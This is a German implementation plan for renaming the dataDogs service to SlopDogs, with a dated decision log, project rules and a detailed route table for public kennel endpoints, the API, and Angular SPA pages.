| 8.27 | **ENTSCHIEDEN 2026-09-25 (10-0: Empfehlungen uebernommen): v2.** | 8.26 | **ENTSCHIEDEN 2026-09-25 (10-0: Empfehlungen uebernommen): proven.** | 8.25 | **ENTSCHIEDEN 2026-09-25 (10-0: Empfehlungen uebernommen): (a).** | 8.24 | **ENTSCHIEDEN 2026-09-25 (10-0: Empfehlungen uebernommen): v1.** | 8.23 | **ENTSCHIEDEN 2026-09-25 (10-0: Empfehlungen uebernommen): (a) Courier Prime.** | 8.22 | **ENTSCHIEDEN 2026-09-25 (10-0: Empfehlungen uebernommen): (A) ruled inlay.** # SlopDogs — Umsetzungsplan A030 (dataDogs -> SlopDogs)

Stand: 2026-09-25. Basis: Branch `feature/slopdogs` @ 4b10138 (= origin/develop nach Fast-Forward, Arbeitsbaum sauber).
Zeilenanker in diesem Plan beziehen sich auf 4b10138; die Berichte nennen f306a17 — die beiden perf(ui)-Commits (78ba628, f306a17) beruehren keine der zitierten Server-Dateien, die Anker sind identisch. Symbolnamen gelten auch nach Verschiebung.

Quellen (Vollberichte, eingearbeitet): Boreal Runde 1 (Ist-Karte) und Runde 2 (Zielbild), Amar Runde 1 (Aufrufwege) und Runde 2 (Umsetzungs-Spezifikation), Follie Runde 1 (Marke/IA) und Runde 2 (Design-Vorlage `slopdogs_landing_vorlage.html` — vom 10-0 verworfen; aus ihr gilt nur noch der technische Rahmen: statische Datei, Datenvertrag, Zustaende, self-hosted Font), Lotus A030-Kurzplan mit Entscheidungsprotokoll. Wo die Berichte einander widersprechen, steht die Aufloesung in Abschnitt 3 — nichts wurde still bevorzugt.

Lesart: **gemessen** = Zahl aus einem Lauf oder Dateigroesse; **gezaehlt** = grep/wc im Repo; **gerechnet** = aus Regeln abgeleitet, nicht gelaufen; **ungemessen** = ausdruecklich offen. Zahlen ohne Herkunft gibt es in diesem Plan nicht.

Projektregeln (gelten fuer jede Phase): `GET /k/:id` bleibt content-type-ehrlich; mobile-first; interne Pakete nur via `file:`, keine `peerDependencies`; keine Pakte in `packages/core`; `ui-app/src/app/pages/kennel-list/kennel-list.component.scss` wird bis P6 nicht angefasst (P6 ersetzt die Liste und loescht die Datei); die Datenbank ist wegwerfbar, keine Backfills, keine Migrationen; Commit-Identitaet `Martin Schmieschek <Martin.Schmieschek@googlemail.com>`, keine `Co-Authored-By`-Zeilen, keine savvytec-Texte; Commits in lesbaren Stuecken und nur, was bewiesen laeuft; Commits nur mit Freigabe des 10-0; nichts nur lokal — alles in git.

---

## 1. Ziel und Entscheidungsprotokoll

### 1.1 Ziel

dataDogs wird SlopDogs: ein Name, eine Marke, ein URL-Raum. Oeffentliche Kennels leben unter `/k/<name>`, die Kennel-Liste unter `/kennels`, `/` wird eine statische, englischsprachige Landing (Positionierung: "a runtime that lets Claude break out of your local network — no deploy, no servers, just start"; Wunschmaschine als Nebenstimme; Crew-Haltung dosiert; viel Raum). Jeder Kennel-Lauf wird gezaehlt, Kennels lassen sich mit Sternen bewerten, Liste und MCP finden Kennels nach Nutzung und Sternen. Am Ende zieht der Dienst auf einen neuen Render-Host um und die Aussenwelt (Skills, ki-fruechte, Claude-Konfiguration, Notizen) folgt.

### 1.2 Entscheidungsprotokoll (wer, was, wann)

| Wann | Wer | Entscheidung |
|---|---|---|
| 2026-09-25 ~11:00 | 10-0 | ~~Landing Richtung A "Trog"; Follies Vorlage (`slopdogs_landing_vorlage.html`) ist die Referenz.~~ **Verworfen** (siehe naechste Zeile). |
| 2026-09-25 nachmittags | 10-0 | Vorlage "Trog" verworfen: zu viel Text, nicht hip, nicht professionell. Follie baut eine neue Vorlage entlang vier Fragen: was ist es, was kann es, wie nutze ich es, was gibt es schon. Folge fuer diesen Plan: P5 legt Datenvertrag, Auslieferung, Zustaende, Budget und Fonts fest; **nichts Optisches** aus `slopdogs_landing_vorlage.html` oder der Richtung "Trog" wird uebernommen. Optik von Landing, Sterne-Widget und Plakette: "neue Vorlage, folgt". |
| 2026-09-25 nachmittags | 10-0 | Kernbotschaft: "ki ist wunschmaschine, wir wünschen und wenns daneben geht einfach nochmal" — Haltung "radikaler … underground dogs, hacker, gangsta mäßig, wutang rap". Design vor Funktion fuer die Vorlage. Follie liefert v3: A "Terminal-Crew" (/k/slopdogs-landing-a) und B "Mixtape" (/k/slopdogs-landing-b, heute noch unter /slopdogs-landing-a/-b). **Wahl A/B offen.** |
| 2026-09-25 spaet | 10-0 | v3 "sehr überladen, braucht mehr raum", alles Englisch, Wuenschen zu prominent. Positionierung: "runtime umgebung um claude aus deinem lokalen netz ausbrechen zu lassen, kein deploy keine server einfach loslegen". Mehr Varianten: v4 a Breakout, b Zine, c Blueprint, d Neon Alley. **Wahl offen.** |
| 2026-09-25 abends | 10-0 | "neon ist der beste vom inhalt, breakout hat beste punchline was die base dogs angeht", alle Varianten auf gleichen Stand; Landing = bestehender Kennel mit Umschalter. -> P5-Aenderung (Kennel `slopdogs-landing`, Content-Dog + 4 Skins, Memo + statischer Fallback). |
| 2026-09-25 abends | 10-0 | 8.1 neuer Dienst, alter wird abgeschaltet sobald der neue laeuft (kein Weiterleiter); 8.2 Daten-Wipe ok; 8.3 Umzug wenn alles fertig; 8.13 Englisch. Neu im Umfang: Rechte je Nutzer (run/read/edit/copy, "ausfuehren ohne lesen"), volles UI-Overhaul, MCP-Texte folgen jeder Pfadaenderung — Spezifikationen folgen (Nira, Follie, Boreal). |
| 2026-09-25 spaet abends | 10-0 | 8.15 ja (public ohne Code-Leserecht), 8.16 nicht einfrieren ausser per Owner-Freeze, 8.17 public = ausfuehrbar, 8.18 Void-Kino + Easter-Egg bleiben, 8.19 Default-Look Mixtape, 8.20 App-Look Mixtape, 8.21 keine Dog-Detailseite, stattdessen /dogs zum Browsen mit Vorschau. P6-Design wird auf Mixtape revidiert. |
| 2026-09-25 nachts | 10-0 | "weiter machen wir sind ja auf einen feature branch, ich möchte dass der plan umgesetzt wird": Umsetzung P2 ff. auf feature/slopdogs; Lotus committet+pusht je nachgemessener Phase auf diesem Branch (nicht develop/integration). 8.22-8.27 wie empfohlen. |
| 2026-09-25 nachts | 10-0 | "wir werden wenn es geklappt hat dieses git verlassen und ein neues repo machen": Nach Abschluss zieht SlopDogs in ein NEUES Repo (statt GitHub-Rename von dataDogs). Folge: P7 Schritt 13 wird "neues Repo anlegen + Stand uebertragen" statt Rename; R2 (Repo-URLs in 55 package.json + UA-Strings) erst, wenn die neue URL feststeht; Render-Dienst zeigt auf das neue Repo. **Uebertragung: frischer Start** (10-0: "wir übertragen als frische start") — neues Repo mit einem Initial-Commit des Endstands, ohne dataDogs-Historie; dataDogs bleibt als Archiv bestehen. |
| 2026-09-25 nachts | Lotus | P2 umgesetzt und nachgemessen (typecheck 0, StartupTest 49/49, 54 @slopdogs-Links, @datadogs im Lock 0, test:mcp:integration 17/17 laut Void). Ausnahmen: ui-app/package-lock.json:40 verwaister Eintrag @datadogs/core (extraneous, bewusst nicht von Hand editiert, faellt beim naechsten Lockfile-Neubau in P6); R0/R2 (Host, Repo-URLs) in P7; docs/slopdogs vom Rename ausgenommen (historische Aussage). Lokale .env noch mit DATADOGS_* (Alias greift). |
| 2026-09-26 | 10-0 | SSRF/DNS-Rebinding = Restrisiko (R30). fix/prisma-connection-pool vor P6 gemergt (8.5). Stand: P1-P5 umgesetzt und je nachgemessen (StartupTest 114/114). |
| 2026-09-26 abends | Lotus | P6 U1-U8 umgesetzt und je nachgemessen (StartupTest 118/118, test:mcp:integration 36/36 laut Void, ui:build ohne Budget-Warnung, Initial 388,10 kB). 6.8: Tests 1,2,4-10,12,13 ok; Test 3 Lighthouse mobil a11y 96/91/96, Performance 74/59/69 (Ziel 85 verfehlt — Ursache Bundle ohne Kompression, offen); Test 11 Grep-Treffer in video-popup (erwartet, 8.18). P7-Runbook auf neues Repo umgestellt (Schritt 0, Schritt 13 entfaellt als Rename). |
| 2026-09-26 nachts | 10-0 | Fix-Runde nach dem lokalen Test (Lotus-Auftrag, Void): unbekannte Tool-Argumente abweisen (MCP und /actions, mit Namensvorschlag), Kompression, DELETE nach Version oder Lineage ohne rohen Store-Text, `delete_node`, `execute_kennel` ohne Ergebnis = gueltige Antwort, a11y Kennel-Seite. **Punkt 2 (Swagger-UI self-hosten) vom 10-0 abgelehnt.** |
| 2026-09-26 nachts | 10-0 | "wir wollen mehrere landing pages in rotation haben, aus .env und kennel id. die sind dann immer schreibgeschuetzt. wenn die in der .env sind. der seed kennel ist nur absolutes default" -> P5-Aenderung "Landing-Rotation": `LANDING_KENNEL_IDS`, `/` rotiert, gelistete Kennels fuer alle gesperrt (`locked_landing`), `slopdogs-landing` nur noch Standard dahinter. |
| 2026-09-26 nachts | 10-0 | "bitte nur mixtape ohne optionen, ausserdem brauchen wir bei der landing page noch den link zu /kennels" -> Seed nur noch Mixtape (Content + Skin C + Lead), kein `?look=`, kein Umschalter; Skins a/b/d archiviert unter `docs/slopdogs/landing/archive/`. Der Link zu /kennels: Befund, dass der vorhandene "All kennels"-Knopf in Skin C sichtbar und erreichbar ist (unter den Top-Kennels, alle Breiten); Kopf/Hero/Footer-Link siehe naechste Zeile. |
| 2026-09-26 nachts | 10-0 | "'Don't write it. Plug it.' ist super punch line aber die beispiele sind etwas arm warum die da sind, wie websocket, oder die gecachten dogs da muessen wir nochmal ran" und "gecachet macht halt sinn bei heavy calls immer wieder zum testen", dann: "aber das muss der frame entscheiden fuers design, texte muessen passen und beat haben." -> **Landing-Copy und -Design liegen beim Frame** (Follie): packs-Abschnitt (Beispiele mit ihrem Warum, Cache = schwere Abrufe einmal, dann immer wieder testen) und die /kennels-Links in Kopf/Hero/Footer. Die Fix-Runde baut nur die Struktur und liefert ein Faktenblatt mit belegten Aussagen je Beispiel. |
| 2026-09-26 nachts | 10-0 | "die reuse dogs nachricht sollte auch klar angeben das die dogs sich ändern können, aber die alte variante noch exestiert. es kann kopiert werden oder über history verwendet werden. aber wir ändern uns alle daher kann eine neuere version toller sein. nichts hat bestand für die ewigkeit." -> MCP-Texte (skill.md "Reused dogs change", `list_nodes`-Beschreibung): Lineage = neueste Version, alte bleibt per Versions-GUID (Historie) oder Kopie. Fuer die Landing-Copy an den Frame weitergereicht. |
| 2026-09-26 nachts | 10-0 | "wie machen wir das mit den beta keys? die sollten ja nicht unendlich oft verwendet werden." — Befund: es gab keine; jeder Google-Login legte ein Konto an. "ein key ein google user"; "ok, wenn alles fertig einfach starten da wir local ja kein auth haben brauchen wir auch kein key, aber beta modus würde ich schon ganz gerne beim nächsten test sehen" -> Closed Beta (P3.5, 3.5.11). Entscheidungen (ueber die Lotus): ein Schalter `SLOPDOGS_STAGE=beta` (Beta-Sticker der Landing + Key-Pflicht, Keys nur mit Auth an); ein Key schaltet genau ein Google-Konto frei, einmal, kein Ablauf, Ende nur durch Einloesen oder Widerruf; auch Bestandskonten einmal beim naechsten Login; nur Hash gespeichert; Verwaltung durch `BETA_ADMIN_EMAILS` (auch production), lokal der Super-User. `BETA_MODE`, `BETA_KEYS_REQUIRED` und `LOGIN_UNLOCK_CODES` verworfen. |
| 2026-09-26 nachts | 10-0 | "landing und kennels sind auch mobil optimiert?" / "zur seite scrollen nervt auf den handy die dinge sollten nie eine fixe breite haben." -> Regel fuer App und Landing: auf 320/375 px scrollt nichts seitlich, keine festen Breiten, die nicht passen; Ausnahme der Wave-Canvas (2D-Flaeche). App: Fix-Runde (Void); Landing: Befunde an den Frame (Follie). |
| 2026-09-26 nachts | Follie | Landing-Copy und -Design (Frame): packs-Abschnitt mit dem Warum je Beispiel, Links zu /kennels in Kopf, Hero und Footer, Beta-Sticker ueber `data-stage` (Platzhalter `‹stage›`, vom Server aus `SLOPDOGS_STAGE` gesetzt). |
| 2026-09-26 spaet nachts | 10-0 | Feature-Runde nach dem lokalen Test (Beta auf 3099/4311): (1) "das klicken eines kennel namens in der liste sollte ihn im neuen tab oeffnen" und "markiert in der liste ist das zuletzt aufgerufene"; (2) "die aufruf liste muss fuer den mcp durchsuchbar mit filtern sein, top alle mit stichworten oder nie benutzt oder nie funktioniert usw."; (3) "auch die dogs muessen ein failed tracking haben und suchbar sein"; (4) "wiederverwenden wenn gefunden und toll"; (5) "example.env sollte schon gut kommentiert werden". |
| 2026-09-26 spaet nachts | Lotus (Void) | Feature-Runde umgesetzt, kein Schema: (1) Name = `/k/<id>?<defaultQuery>` im neuen Tab (`target=_blank rel=noopener`), Rest der Zeile = `/kennels/<id>`; zuletzt geoeffneter Kennel je Browser markiert (`slopdogs.kennelList.lastOpened.v1`, Tintenbalken, Chip `last opened`, `aria-current`). (2)+(3) `usage=top\|never_used\|never_worked\|failing\|dormant` in `ListQuery` fuer `list_kennels`, `list_nodes`, `GET /api/kennels`, `GET /api/nodes` (nach dem Rechtefilter, mit search/q und sort): top = Aufrufe > 0, ohne sort nach Aufrufen; never_used = 0 Aufrufe gesamt; never_worked = Aufrufe > 0 und jeder gescheitert (Kennel `leadFailed == total`, Dog `failures == total`, failures = error + timeout + oom); failing = gescheiterter Lauf in 30 Tagen (`leadFailed30d` bzw. `failures30d` > 0); dormant = Aufrufe gesamt > 0, 0 in 30 Tagen. Neu `sort=failures30d`, Dogs `minReliability`, Felder `stats.calls.leadFailed30d` (Kennel) und `stats.calls.failures` (Dog) — je eine Spalte mehr im bestehenden GROUP BY. MCP-Zahlensortierungen ohne `dir` laufen absteigend (REST bleibt asc). (4) Feste Regel "erst `list_nodes {search, sort:'proven'}`, passender zuverlaessiger Dog -> wiederverwenden, nur Fehlendes schreiben" in Werkzeugkasten, skill.md, list_nodes, build_kennel; `build_kennel` antwortet mit `hints[]` (gleicher/sehr aehnlicher Name oder Beschreibung wie ein bewaehrter, ausfuehrbarer Dog, mit dessen lineageId; blockiert nichts). (5) Env-Katalog `server-app/startupEnvCheck.ts` (85 Variablen) -> eine Startzeile je fehlender Pflicht-Variable je NODE_ENV; `.env.example`/`.env.integration.example` gegliedert (Pflicht / Betrieb und Grenzen / Funktionen / Integrationen / Entwicklung / Intern). Befund: `SESSION_SECRET` ist auch lokal Pflicht (ohne bricht `createSessionMiddleware` den Start ab). Nachgemessen: StartupTest 131/131 (vorher 124/124), test:mcp:integration 48/48 gegen 3096, ng build ohne Budget-Warnung (Initial 388,19 kB), DOM-Test Headless 11/11 (Name -> neuer Tab, Markierung nach Reload, 375 px ohne seitliches Scrollen). |
| 2026-09-25 ~11:00 | 10-0 | Umbenennung komplett: sichtbar (T1), Code-Scope `@datadogs/*` -> `@slopdogs/*` (T2), Protokoll/Identitaet (T3), Infrastruktur inkl. neuem Render-Host (T4). Lotus-Einwand (T2 nie, Host behalten) ist protokolliert und ueberstimmt. |
| 2026-09-25 ~11:00 | 10-0 | Eigene Kennels werden nicht bewertet — Owner und Editoren sehen nur die Anzeige. |
| 2026-09-25 ~11:10 | 10-0 | P0 erledigt: origin/develop 2791775..4b10138 per Fast-Forward; `feature/slopdogs` von develop, mit Upstream gepusht; `fix/prisma-connection-pool` (78ba628, f306a17) als eigener Branch auf origin. |
| 2026-09-25 | 10-0 | "der plan ist mir viel zu wenig" — der Kurzplan wird durch dieses Dokument ersetzt. |
| 2026-09-25 | Lotus | Kein MCP-Werkzeug zum Bewerten in v1 (Amar-Empfehlung 3). |
| 2026-09-25 | Lotus | Praefix `/k/`. Swagger-UI und Spec unter `/k/:id/docs` und `/k/:id/openapi.json`, alte `/api/kennels/:id/docs|swagger.json` antworten 308. |
| 2026-09-25 | Lotus | Teilen-Knopf teilt die Public-Seite `/k/:id?<defaultQuery>`, nicht den Viewer. |
| 2026-09-25 | Lotus | SPA-Routen `/kennels`, `/kennels/:id`, `/kennels/:id/edit`; `/kennel/*` per Angular `redirectTo`. |
| 2026-09-25 | Lotus | `HEAD /k/:id` antwortet ohne Lauf und zaehlt nicht. |
| 2026-09-25 | Lotus | `/api/kennels/:id/execute` bleibt vorerst. |
| 2026-09-25 | Lotus | Public-Bremse heisst `MAX_CONCURRENT_PUBLIC_RUNS`, Default 4, gehoert in P1 (Fixes vor Features). Amars `MAX_CONCURRENT_PUBLIC_REQUESTS=6` (Commit 8 seiner Reihe) ist ersetzt; der Commit-Schnitt in P4 ist entsprechend angeglichen. |
| 2026-09-25 | Lotus | Amars zehn Empfehlungen gelten alle (Rangquellen public/api-execute/mcp-execute; Owner/Editor bewerten nicht; kein rate_kennel; Bayes C=5; Flush 30 s; leadFailed mitzaehlen; UTC-Tag; list_kennels ohne limit bares Array; stats an jeder Kennel-Antwort; eigenes Public-Budget). |
| 2026-09-25 | Lotus | Reihenfolge P1 Fixes -> P2 Umbenennung komplett (T1-T3 im Repo) -> P3 `/k/` + URL-Zielbild -> P4 Aufrufe/Sterne/Suche/Landing-API -> P4b Dog-Aufrufe und Wiederverwendung -> P4c User-Key-Store -> P5 Landing -> P6 Host-Umzug + Aussenwelt. |
| 2026-09-25 nachmittags | 10-0 | Umfang erweitert: (a) Aufrufzaehlung je einzelnem Dog, (b) Nachverfolgung, in welchen Kennels ein Dog wiederverwendet wird, und Sichtbarkeit bewaehrter Dogs, (c) nutzergebundener Key-Store, den Dogs zur Laufzeit verwenden. Amar hat (a)+(b) spezifiziert (`amar_slopdogs_dogs.md`, P4b), Nira (c) (`nira_slopdogs_keystore.md`, P4c). |
| 2026-09-25 nachmittags | Lotus | Key-Store: nur Option B (`keys.fetch`, Klartext nie in der VM), Option A wird nicht gebaut; Aufloesung nach Runner-Identitaet; fail-closed ohne echte `user.id`; Domain-Allowlist je Key Pflicht; UI-Hinweis "DB-Reset loescht Keys". Leck L4/L5 (Snapshot-Werkzeuge ohne per-Dog-Redaktion) wandert als Fix nach P1. |
| 2026-09-25 nachmittags | Lotus | P4b: Core wird an genau einer Stelle beruehrt (`IDogRunObserver` + Cache-Wrapper), kein Pakt, kein Schema — Begruendung in 4b.1. Amars Speicherabschaetzung ist gerechnet, nicht gemessen; Messpunkt in der Abnahme (4b.10 Test 14). |
| 2026-09-25 nachts | Follie (Rev. 2), Lotus | `follie_slopdogs_ui.md` Revision 2 eingearbeitet: P6 auf die Mixtape-Welt umgestellt (App = Inlay-Karte und Deck; Tokens aus `skin_c.js`, Kontrasttabelle als gerechnet, Monaco-Theme "inlay", Canvas "ruled inlay"); IA mit `/dogs`-Browser und Vorschau statt `/dogs/:id`; `[USE IN KENNEL]` pinnt run-only-Dogs; `frozen` in Liste/Kopf/Settings/Access (Feld in P3.5 3.5.3); Void-Kino und Iris bleiben (U1); Inventar 42 Komponenten; U1-U8 neu. Follies "P4d" = P3.5; Follies "8.13 stale" ist erledigt (Englisch entschieden). Follies COPY-Schalter entfaellt weiter (W16). Neue offene Punkte 8.22-8.26. |
| 2026-09-25 spaet | Nira, Boreal, Follie | Drei weitere Vollberichte eingearbeitet: `nira_slopdogs_rechte.md` (Rechtemodell NONE<RUN<READ<EDIT<OWN, COPY=READ, `run-only` + `runners`, `canRun`, Redaction-Modus, 22 Leckwege, 12 Tests, 6 Commits -> P3.5 und P1), `boreal_slopdogs_ui_mcp.md` (UI-Bestand behalten/umbauen/neu/streichen; 41 MCP-Textstellen je Phase; Routentabelle als Code + Doc-Lint + Gateway-Asserts -> P3 und Pflichtpunkt je Phase), `follie_slopdogs_ui.md` (App-Look B: dunkle Werkstatt, vier Akzente per `data-look`; DESIGN.md; IA mit 11 Screens, `/dogs/:id`, `/account`; 30 Komponenten; U1-U8; Budget-Strategie -> P6). |
| 2026-09-25 spaet | Lotus | **Phasenfolge neu:** P1 Fixes (+ Niras F1-F5 als sofort deploybarer Commit) -> P2 Umbenennung -> P3 `/k/` + URL-Zielbild (+ Routentabelle als Code, Doc-Lint `scripts/check-doc-paths.cjs` in `npm test`, Gateway-Asserts) -> **P3.5 Rechte v2** (Nira; vor P4, Begruendung in P3.5) -> P4 -> P4b -> P4c -> P5 Landing-Kennel -> **P6 UI-Overhaul** (Follie U1-U8; die UI-Teile aus P3.5/P4/P4b/P4c werden in P6 gebaut, dort nur minimal/API-seitig) -> **P7 Host-Umzug + Aussenwelt** (bisheriges P6-Runbook, zuletzt, nach 8.3). |
| 2026-09-25 spaet | Lotus | MCP-Texte: in jeder Phase ein Pflichtpunkt "MCP-Texte nachziehen" mit Boreals Stellenliste (Abschnitt 4.0); Pfade in Tool-Texten aus der Pfad-Konstante (`publicKennelPath`) bauen; `.cursor/skills/*-mcp-gateway/SKILL.md` auf einen Verweis reduzieren (P2). |
| 2026-09-25 spaet | Lotus | Superuser-Modus (`MCP_AUTH_REQUIRED` nicht `true`) in production/integration: Start verweigern (P3.5 Commit 6). Export nicht lesbarer Dogs: Referenz-Stub statt Abbruch. Editor-Seite faellt: bearbeitet wird im Inspector, die Route `/kennels/:id/edit` oeffnet den Drawer (P6 U6). Key-Store-UI in der App unter `/account` (kein serverseitiges HTML fuer Keys). 78ba628 + f306a17 vor P3 mergen (8.5 a bleibt Empfehlung, Bedingung int-Test). `kennel-list.component.scss`: "nicht anfassen" gilt bis P6; in P6 wird die Liste ersetzt. |
| offen | 10-0 | Void-Start (8.4); Merge 8.5; fremder run-only-Dog im eigenen Kennel (8.15); Community einfrieren (8.16); run-only in Listen/Landing (8.17); Void-Kino (8.18); Default-Landing-Look (8.19); App-Look B (8.20); Dog-Seite `/dogs/:id` (8.21). Siehe Abschnitt 8. |

---

## 2. URL-Zielbild

### 2.1 Die Regel

Vier Namensraeume, jeder in einem Satz (Boreal Zielbild 0):

- `/k/…` — **Ware.** Alles, was ein Fremder ohne Login bekommt und weitergibt: der Lauf, die Doku des Laufs, die Spec des Laufs. Content-type-ehrlich, kein Envelope, kein Angular.
- `/api/…` — **Werkstatt.** Alles, was Identitaet braucht oder Innereien zeigt: CRUD, Waves, Versionen, Export/Import, Rating, Stats, Landing-Daten, WebSocket-Hub.
- `/kennels…` — **Buehne.** Die Angular-SPA fuer den Menschen am Bildschirm: Liste, Viewer, Editor. Ein Praefix, nicht zwei.
- `/` — **Schaufenster.** Statisch, DB-frei, sofort.

Ein Kennel-Name ist immer und nur das zweite Segment hinter `/k/`. Damit kollidiert er mit keinem festen Pfad mehr; die dreifach gepflegte Blockliste (`packages/core/src/kennelReservedNames.ts:7-18`, `api/routes/spaRouteConstants.ts:13-16`, `ui-app/src/app/config/kennel-reserved-names.ts:5`) faellt und wird durch eine Segment-Regel ersetzt (2.6).

### 2.2 Routentabelle (Zielzustand nach P6; Quelle im Code ab P3: `api/routes/routeTable.ts`, 3.9)

Auth-Kuerzel: `anon` = jeder; `canRead` = `mcp/auth/visibility.ts:62-74` (public, Owner, Editor, Viewer, Community, SuperUser); `login` = `requireLogin` `api/routes/ConfigRouteHandler.ts:16-27` (401 + `WWW-Authenticate`); `canMutate` = `visibility.ts:82-90`; Session = Cookie; Bearer = PAT/JWT (`mcp/auth/bearer.ts`).

#### Schaufenster

| Methode | Pfad | Bediener (Datei) | Auth | Antwort | Alter Pfad | Uebergang |
|---|---|---|---|---|---|---|
| GET | `/` | NEU `app.get('/')` in `server-app/httpFrontEnd.builtUi.ts` vor `express.static(angularBrowserDir)` (:10); liefert `public/landing/index.html`; dev (`httpFrontEnd.development.ts:7-9`) liefert dieselbe Datei statt 302 | anon | `text/html`, DB-frei, `Cache-Control: public, max-age=300` | `/` = Angular-index (Liste) | neu; alte Liste lebt unter `/kennels` |
| HEAD | `/` | derselbe Handler (Express beantwortet HEAD ueber GET) | anon | leer | `/` | ki-fruechte-Keepalive (builder.js:113, :1028) laeuft weiter |
| GET | `/robots.txt` | NEU in `httpFrontEnd.builtUi.ts` neben `/`; liefert `public/landing/robots.txt` | anon | `text/plain` | — (heute: DB-Lookup + SPA-index) | neu |
| GET | `/api/landing?limit=` | NEU `api/routes/LandingRouteHandler.ts`, registriert **vor** `ConfigRouteHandler` (`createHttpApplication.ts:211`), sonst faengt `/api/:subpath` den Pfad | anon; Liste wird mit ANON-ctx gefiltert, unabhaengig vom Aufrufer | JSON (P4 Abschnitt 4.7), Memo 60 s, `Cache-Control: public, max-age=60`, ETag | — | neu |

#### Ware — pro Kennel, oeffentlich, teilbar

| Methode | Pfad | Bediener | Auth | Antwort | Alter Pfad | Uebergang |
|---|---|---|---|---|---|---|
| GET | `/k/:id` | `api/routes/KennelRunHandler.ts:67` -> `handlePublicGet` :539-583; Reserved-Check :541-544 entfaellt; Nichtfund -> 404 JSON statt `next()` :549-555 | canRead (sonst 404, :559) | content-type-ehrlich (`sendResult` :438-461): HTML / Markdown / JSON; Lobby-Form `{snapshot,live}` -> HTML | `/:id` | 308 aus der Alt-Weiche (2.4) |
| GET | `/k/:id?<query>` | wie oben; Query ueber `defaultQuery` gemischt, Keys und Werte lowercased (`mergeQueryParams` :83-93) | canRead | wie oben | `/:id?<query>` | 308 traegt Query (Boreal-Sonde) |
| GET | `/k/:id?version=<guid>` | `loadKennelConfig(id, version)` :76-80 | canRead | alte Inkarnation | `/:id?version=` | 308 |
| GET | `/k/:id?format=json` bzw. `?data=1` | `clientWantsJson` :26-35 -> Snapshot statt Live-HTML (nur Lobby-Form) | canRead | `application/json` | gleich | 308 |
| GET | `/k/:id?channelId=<c>` | QueryRetriever -> `packages/core/src/socket/WebSocketChannelRetriever.ts:84-90`; Teilen-Link entsteht im Browser aus `location.pathname` (`ChannelLiveSnippetRetriever.ts:199`, `mcp/skill.md:841`) -> automatisch `/k/:id?channelId=` | canRead | HTML mit `wsUrl` `/api/channels?channelId=` | `/:id?channelId=` | 308; kein Dog aendert sich |
| POST | `/k/:id` | :68 -> `handlePublicPost` :585-624; Body ersetzt `defaultBody` :610-611 | canRead | wie GET | `/:id` | 308 (Methode + Body bleiben, RFC 7538) |
| HEAD | `/k/:id` | NEU `app.head('/k/:kennelId')` **vor** `app.get`: `loadKennelConfig` + canRead, dann 200 ohne Body (404 wenn unbekannt/unlesbar); **kein Lauf, keine Zaehlung, nicht an der Public-Bremse** | canRead | leer, `Cache-Control: no-store` | `/:id` (fuehrte den Kennel aus) | Lotus-Entscheidung; ohne diese Route wuerde Express HEAD ueber den GET-Handler beantworten und den Kennel laufen lassen |
| GET | `/k/:id/docs` | `api/routes/KennelSwaggerHandler.ts:25` -> `handleSwaggerUi` :98-209, umgehaengt; `specUrl` :110 -> `/k/:id/openapi.json` | anon (privat zeigt Schloss :105-106) | `text/html` (Swagger-UI von unpkg :116, :191) | `/api/kennels/:id/docs` | 308 (GET, `?version` bleibt) |
| GET | `/k/:id/openapi.json` | `KennelSwaggerHandler.ts:24` -> `handleSwaggerJson` :28-52; Warmlauf nur bei canRead :40-43; **an der Public-Bremse** | anon (Struktur), Beispiele nur canRead | `application/json`, OpenAPI 3.0.3, `paths['/k/<id>']` (`packages/swaggrid/src/grimoire.ts:243` bekommt den Pfad uebergeben), `servers.url ''` (:241) | `/api/kennels/:id/swagger.json` | 308 (GET, `?version` bleibt) |

#### Buehne — Angular-SPA (`ui-app/src/app/app.routes.ts`)

| Methode | Pfad | Bediener | Auth | Antwort | Alter Pfad | Uebergang |
|---|---|---|---|---|---|---|
| GET | `/kennels` | SPA-Fallback (`httpFrontEnd.builtUi.ts:15-22`) -> Angular `kennels` -> `KennelListComponent` (heute Route `''` :4-8) | anon (ACL-Filter serverseitig) | `index.html` | `/` | neu |
| GET | `/kennels?q=<text>` | dito; Liste liest `q` aus der URL (heute nur localStorage fuer die Sortierung :39-67 — kleiner Umbau) | anon | `index.html` | — | neu (Landing-Suche verlinkt hierher) |
| GET | `/kennels?new=1` | dito; Liste setzt `showCreateForm` (:282) auf true; anonym -> `auth.login('/kennels?new=1')` | anon laden, Anlegen login | `index.html` | — | neu (Landing-Knopf "Neuen Kennel anlegen") |
| GET | `/kennels/:id` | Angular `kennels/:id` -> `WavesViewerComponent` (heute `kennel/:id` :9-13; `paramMap` `waves-viewer.component.ts:267-270`) | anon; Waves per `/api/kennels/:id/run` mit Redaktion (`KennelRunHandler.ts:269-317`) | `index.html` | `/kennel/:id` | Angular `redirectTo` (beide Pfade landen im SPA-Fallback, kein Server-308 noetig) |
| GET | `/kennels/:id?panel=rating` | dito; Viewer oeffnet den Inspector mit Tab `rating` (P4 UI) | anon | `index.html` | — | neu |
| GET | `/kennels/:id/edit` | Angular `kennels/:id/edit` -> `KennelConfigComponent` (heute `kennel/:id/edit` :14-18) | anon laden, Speichern canMutate | `index.html` | `/kennel/:id/edit` | Angular `redirectTo`; BACKLOG.md:20 (in den Viewer falten) bleibt Backlog, nicht Teil von A030 |
| GET | `/kennel`, `/kennel/:id`, `/kennel/:id/edit` | Angular `redirectTo` -> `/kennels…` | — | — | heute Viewer | uebergangsweise; faellt zusammen mit der Alt-Weiche |
| GET | `/dogs?q=&sort=proven\|calls30d\|reuse\|name&group=&pack=&owner=&dog=<lineageId>` | Angular (P6 U5, Entscheidung 8.21: Browser mit Vorschau, **kein** `/dogs/:id`) | anon (ACL-Filter; Vorschau-Code nur bei READ) | `index.html` | — | neu |
| GET | `/account?tab=profile\|tokens\|keys` | Angular (P6 U7) -> Profil, PATs, Key-Store (P4c) | login (sonst `/login?returnTo=/account`) | `index.html` | `/auth/tokens` (Server-HTML, bleibt als Rueckfall) | neu |
| GET | `/login?returnTo=` | Angular (P6 U7) -> ein Knopf `Continue with Google` -> `/auth/google/login?returnTo=` | anon | `index.html` | nackter Redirect aus `auth.service.ts:40-44` | neu |
| GET | `/api/:sub/:id/acl` (+ PUT, POST `/transfer`) | NEU `api/routes/AclRouteHandler.ts` (P3.5 3.5.6) | Owner/Editor lesen, Owner schreiben | JSON `{visibility, ownerId, editors, viewers, runners, myRights}` | nur MCP `acl.ts` | neu |
